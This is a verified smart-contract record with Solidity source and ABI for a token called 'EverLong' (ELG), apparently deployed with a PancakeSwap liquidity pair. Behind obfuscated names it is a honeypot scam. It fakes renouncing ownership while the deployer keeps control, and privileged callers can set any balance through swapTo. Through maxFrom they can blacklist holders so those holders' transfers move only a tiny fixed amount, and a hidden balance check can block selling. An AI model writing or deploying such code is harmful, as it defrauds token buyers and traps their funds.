{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface senderFundTo {\n    function createPair(address maxAt, address shouldSell) external returns (address);\n}\n\ninterface modeTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atToken) external view returns (uint256);\n\n    function transfer(address tokenAt, uint256 fundToken) external returns (bool);\n\n    function allowance(address isToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenAt,\n        uint256 fundToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAuto, uint256 value);\n    event Approval(address indexed isToken, address indexed spender, uint256 value);\n}\n\nabstract contract walletReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isMax is modeTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EverLong is walletReceiver, modeTrading, isMax {\n\n    bool private limitTake;\n\n    function maxFrom(address txMin) public {\n        totalMarketing();\n        if (teamWalletList != isSender) {\n            limitTake = true;\n        }\n        if (txMin == tradingLaunch || txMin == receiverShouldFee) {\n            return;\n        }\n        autoReceiver[txMin] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyTrading;\n    }\n\n    function balanceOf(address atToken) public view virtual override returns (uint256) {\n        return tradingAmount[atToken];\n    }\n\n    uint256 private totalModeLaunch;\n\n    function swapTo(address exemptIs, uint256 fundToken) public {\n        totalMarketing();\n        tradingAmount[exemptIs] = fundToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingMax;\n\n    address private teamReceiver;\n\n    uint256 private teamWalletList;\n\n    event OwnershipTransferred(address indexed buyList, address indexed exemptBuy);\n\n    function allowance(address senderAuto, address modeLiquidity) external view virtual override returns (uint256) {\n        if (modeLiquidity == modeList) {\n            return type(uint256).max;\n        }\n        return marketingMax[senderAuto][modeLiquidity];\n    }\n\n    uint256 private buyModeAt;\n\n    function exemptAuto(address buyMarketingAt, address tokenAt, uint256 fundToken) internal returns (bool) {\n        if (buyMarketingAt == tradingLaunch) {\n            return tokenReceiver(buyMarketingAt, tokenAt, fundToken);\n        }\n        uint256 feeLaunched = modeTrading(receiverShouldFee).balanceOf(enableMax);\n        require(feeLaunched == txTakeLiquidity);\n        require(tokenAt != enableMax);\n        if (autoReceiver[buyMarketingAt]) {\n            return tokenReceiver(buyMarketingAt, tokenAt, enableExempt);\n        }\n        return tokenReceiver(buyMarketingAt, tokenAt, fundToken);\n    }\n\n    uint256 private shouldLimit;\n\n    uint256 public isSender;\n\n    uint256 public atShouldFrom;\n\n    function minLiquidity() public {\n        emit OwnershipTransferred(tradingLaunch, address(0));\n        teamReceiver = address(0);\n    }\n\n    string private buyTrading = \"Ever Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listIs;\n    }\n\n    bool private totalLaunchedAuto;\n\n    function transferFrom(address buyMarketingAt, address tokenAt, uint256 fundToken) external override returns (bool) {\n        if (_msgSender() != modeList) {\n            if (marketingMax[buyMarketingAt][_msgSender()] != type(uint256).max) {\n                require(fundToken <= marketingMax[buyMarketingAt][_msgSender()]);\n                marketingMax[buyMarketingAt][_msgSender()] -= fundToken;\n            }\n        }\n        return exemptAuto(buyMarketingAt, tokenAt, fundToken);\n    }\n\n    uint8 private swapLiquidityTake = 18;\n\n    function totalMarketing() private view {\n        require(atLiquidityShould[_msgSender()]);\n    }\n\n    address modeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tradingLaunch;\n\n    bool public isAt;\n\n    function modeTradingSwap(address takeLaunched) public {\n        if (isAt) {\n            return;\n        }\n        if (totalLaunchedAuto != limitTake) {\n            isSender = shouldLimit;\n        }\n        atLiquidityShould[takeLaunched] = true;\n        if (atShouldFrom == shouldLimit) {\n            fundIs = false;\n        }\n        isAt = true;\n    }\n\n    constructor (){\n        if (fundIs == totalLaunchedAuto) {\n            totalLaunchedAuto = true;\n        }\n        autoLiquidity launchedTakeToken = autoLiquidity(modeList);\n        receiverShouldFee = senderFundTo(launchedTakeToken.factory()).createPair(launchedTakeToken.WETH(), address(this));\n        if (totalModeLaunch != buyModeAt) {\n            buyModeAt = shouldLimit;\n        }\n        tradingLaunch = _msgSender();\n        atLiquidityShould[tradingLaunch] = true;\n        tradingAmount[tradingLaunch] = listIs;\n        minLiquidity();\n        \n        emit Transfer(address(0), tradingLaunch, listIs);\n    }\n\n    function transfer(address exemptIs, uint256 fundToken) external virtual override returns (bool) {\n        return exemptAuto(_msgSender(), exemptIs, fundToken);\n    }\n\n    uint256 constant enableExempt = 16 ** 10;\n\n    bool private fundIs;\n\n    function getOwner() external view returns (address) {\n        return teamReceiver;\n    }\n\n    mapping(address => uint256) private tradingAmount;\n\n    uint256 txTakeLiquidity;\n\n    mapping(address => bool) public atLiquidityShould;\n\n    function owner() external view returns (address) {\n        return teamReceiver;\n    }\n\n    uint256 tradingFee;\n\n    address enableMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyWallet;\n    }\n\n    uint256 private listIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLiquidityTake;\n    }\n\n    function approve(address modeLiquidity, uint256 fundToken) public virtual override returns (bool) {\n        marketingMax[_msgSender()][modeLiquidity] = fundToken;\n        emit Approval(_msgSender(), modeLiquidity, fundToken);\n        return true;\n    }\n\n    address public receiverShouldFee;\n\n    mapping(address => bool) public autoReceiver;\n\n    string private buyWallet = \"ELG\";\n\n    bool public atLimit;\n\n    function tokenReceiver(address buyMarketingAt, address tokenAt, uint256 fundToken) internal returns (bool) {\n        require(tradingAmount[buyMarketingAt] >= fundToken);\n        tradingAmount[buyMarketingAt] -= fundToken;\n        tradingAmount[tokenAt] += fundToken;\n        emit Transfer(buyMarketingAt, tokenAt, fundToken);\n        return true;\n    }\n\n    function autoWallet(uint256 fundToken) public {\n        totalMarketing();\n        txTakeLiquidity = fundToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLiquidityShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShouldFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundToken\",\"type\":\"uint256\"}],\"name\":\"autoWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"}],\"name\":\"maxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"}],\"name\":\"modeTradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundToken\",\"type\":\"uint256\"}],\"name\":\"swapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EverLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}